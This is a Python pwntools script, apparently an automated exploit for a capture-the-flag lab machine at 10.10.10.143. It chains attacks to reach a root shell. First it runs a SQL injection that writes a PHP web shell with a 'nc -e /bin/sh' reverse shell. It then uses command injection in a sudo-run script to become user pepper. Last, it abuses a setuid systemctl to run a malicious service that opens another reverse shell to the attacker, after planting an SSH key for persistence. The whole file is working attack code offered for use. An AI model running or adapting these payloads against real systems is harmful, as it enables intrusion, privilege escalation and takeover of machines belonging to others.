# -*- coding: utf-8 -*-
import os
import sys
import requests
import random
from pwn import *
import netifaces as ni
from threading import Thread

ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
url = 'http://10.10.10.143'
r = requests.get(url)
cookie = r.headers['Set-Cookie'].split(';')[0].split('=')[1]
cookie = dict(PHPSESSID=cookie)
fname = random.randint(1,100001)

def limited():
	payload = '''room.php?cod=-2 union select 1,2,3,'<?php exec("nc -e /bin/sh {} 1234");?>',5,6,7 into outfile '/var/www/html/{}.php' '''.format(ip,str(fname))
	r = requests.get(url+'/'+payload, cookies=cookie)
	log.info('Got the www-data shell')
	r = requests.get(url+'/'+str(fname)+'.php')

def listener(interactive,port):
	if interactive=='payload':
		l=listen(port)
		c = l.wait_for_connection()
		log.info('Escalating....')
		l.sendline('echo "nc -e /bin/sh {} 123" > /tmp/{}.sh'.format(ip,str(fname)))
		l.sendline('sudo -u pepper /var/www/Admin-Utilities/simpler.py -p')
		l.recvuntil("Enter an IP:")
		log.info('Got the pepper shell')
		l.sendline("$(/bin/sh /tmp/{}.sh)".format(str(fname)))
	elif interactive=='root':
		l = listen(port)
		c = l.wait_for_connection()
		log.info('Found setuid binary : /bin/systemctl')
		log.info('Generating SSH Keys')
		os.system('yes y | ssh-keygen -t rsa -b 4096 -C "email@email.com" -m PEM -N "" -f /root/.ssh/id_rsa')
		log.info('Writing to authorized_keys')
		with open('/root/.ssh/id_rsa.pub') as f:
			content = f.read()
		f.close()
		l.sendline('mkdir /home/pepper/.ssh')
		l.sendline('chmod 700 /home/pepper/.ssh')
		print content.strip()
		l.sendline('echo "{}" > /home/pepper/.ssh/authorized_keys'.format(content.strip()))
		l.close()
		p = ssh(host='10.10.10.143',user='pepper',keyfile='/root/.ssh/id_rsa')
		s = p.process("/bin/sh")
		s.sendline('cd /tmp')
		s.sendline('TF=$(mktemp).service')
		payload="""
		echo '[Service]
		Type=oneshot
		ExecStart=/bin/sh -c "/bin/nc -e /bin/sh {} 1337"
		[Install]
		WantedBy=multi-user.target' > $TF """.format(ip)
		s.sendline(payload)
		s.sendline('/bin/systemctl link $TF')
		s.sendline('/bin/systemctl enable --now $TF')
	else:
		l = listen(port)
		c = l.wait_for_connection()
		l.sendline('id')
		l.sendline('''python -c 'import pty;pty.spawn("/bin/bash")' ''')
		l.interactive()

if __name__=="__main__":
	print '''\033[01m\033[93m
      _                             _            
   _ | |  __ _      _ _   __ __    (_)     ___   
  | || | / _` |    | '_|  \ V /    | |    (_-<   
  _\__/  \__,_|   _|_|_   _\_/_   _|_|_   /__/_  
_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
										\033[01m\033[34mBy MrR3boot'''

	print "\033[01m\033[91mLet's Grab the shells"
	print "\033[92m1. www-data"
	print "2. pepper"
	print "3. root"
	input = input("\033[95m> ")
	if input == 1:
		t1 = Thread(target=limited)
		log.info('[+] Creating Listener')
		t2 = Thread(target=listener,args=('interactive','1234',))
		t2.start()
		log.info('[+] Exploiting SQLi')
		t1.start()
	elif input == 2:
		t1 = Thread(target=limited)
		t2 = Thread(target=listener,args=('payload','1234',))
		t3 = Thread(target=listener,args=('interactive','123',))
		t2.start()
		t1.start()
		t3.start()
	elif input == 3:
		t1 = Thread(target=limited)
		t2 = Thread(target=listener,args=('payload','1234',))
		t3 = Thread(target=listener,args=('root','123',))
		t4 = Thread(target=listener,args=('interactive','1337',))
		t2.start()
		t1.start()
		t4.start()
		t3.start()
	else:
		sys.exit(0)
